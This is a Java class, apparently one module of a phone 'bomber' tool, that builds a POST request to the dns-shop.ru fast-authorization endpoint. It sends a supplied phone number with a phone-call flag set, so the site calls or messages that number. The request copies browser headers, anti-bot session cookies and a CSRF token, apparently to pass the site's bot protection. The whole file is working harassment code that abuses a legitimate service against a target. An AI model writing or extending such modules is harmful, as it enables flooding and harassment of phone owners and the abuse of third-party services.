package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.MultipartBody;
import okhttp3.Request;
import okhttp3.RequestBody;

public class DnsShop extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("FastAuthorizationLoginLoadForm[login]", phone.phone())
                .addFormDataPart("FastAuthorizationLoginLoadForm[token]", "")
                .addFormDataPart("FastAuthorizationLoginLoadForm[isPhoneCall]", "1")
                .build();

        return new Request.Builder()
                .url("https://www.dns-shop.ru/auth/auth/fast-authorization/")
                .post(requestBody)
                .header("accept", "*/*")
                .header("accept-language", "en-US,en;q=0.9,ru;q=0.8")
                .header("cache-control", "max-age=0")
                .header("content-type", "multipart/form-data; boundary=----WebKitFormBoundary5mJQzVwAzWPRESlW")
                .header("cookie", "qrator_jsr=1712669416.794.lXRdCuGAqMz95FZa-8ad09j6ck41d50pju4c1h1pdns42rc9c-00; qrator_jsid=1712669416.794.lXRdCuGAqMz95FZa-7o050f4l116jvi2kcnket1b970hr9m61; qrator_ssid=1712669417.683.AzduKdMwasnaLDa3-c38opqgeaknmilcl86ulaop9pf9sgisl; lang=ru; current_path=0acadf1cfee13c3a4a894015f1e58d4002cab91e0cea2e98d8ae55532de3578aa%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A169%3A%22%7B%22city%22%3A%229181c5a2-1ede-11e0-90cc-001517c526f0%22%2C%22cityName%22%3A%22%5Cu0423%5Cu0441%5Cu043e%5Cu043b%5Cu044c%5Cu0435-%5Cu0421%5Cu0438%5Cu0431%5Cu0438%5Cu0440%5Cu0441%5Cu043a%5Cu043e%5Cu0435%22%2C%22method%22%3A%22geoip%22%7D%22%3B%7D; rrpvid=643091531270557; _ab_=%7B%22aaa-test%22%3A%22GROUP_AAA_1%22%7D; city_path=moscow; phonesIdentV2=555513a1-25a7-42ee-a3aa-af0f45694f5b; cartUserCookieIdent_v3=d456026cf384cd8fcf1dca4994e6e5e539896e54ca4fc93f5f7405cbca453abda%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%22aa6791f8-13c0-3206-ab13-1caa6069479f%22%3B%7D; _gcl_au=1.1.155639922.1712669420; rcuid=66151e08ce794e5e5789aa8a; _ga=GA1.1.1540771840.1712669421; tmr_lvid=b2acb88c938f732fa3fdf8ee94465a2d; tmr_lvidTS=1712669420773; _ym_uid=171266942110022375; _ym_d=1712669421; _ym_isad=2; _ym_visorc=b; domain_sid=QHmmfYEFpyWwWH2vhjHRy%3A1712669421793; dnsauth_csrf=a236482c2637cac8c8c621feb6aa174e1249193072e1d8e5c4f418453d220c3ca%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%22032745d3-5131-40d1-a87b-b1919c06215e%22%3B%7D; tmr_detect=0%7C1712669423583; _ga_FLS4JETDHW=GS1.1.1712669420.1.1.1712669433.47.0.1544560304")
                .header("origin", "https://www.dns-shop.ru")
                .header("referer", "https://www.dns-shop.ru/no-referrer")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-ch-ua-platform", "\"Linux\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("x-csrf-token", "S1-8G-tdyzZHy3_FYxi1RCP9f1AdRrbc49Ronin2mWA4Ns9SgTuxRSmlRrAQadAgQIhKAU4jwp2LrFGqZ5-sIw==")
                .header("x-requested-with", "XMLHttpRequest");
    }

    @Override
    public String getServiceName() {
        return "DnsShop";
    }
}
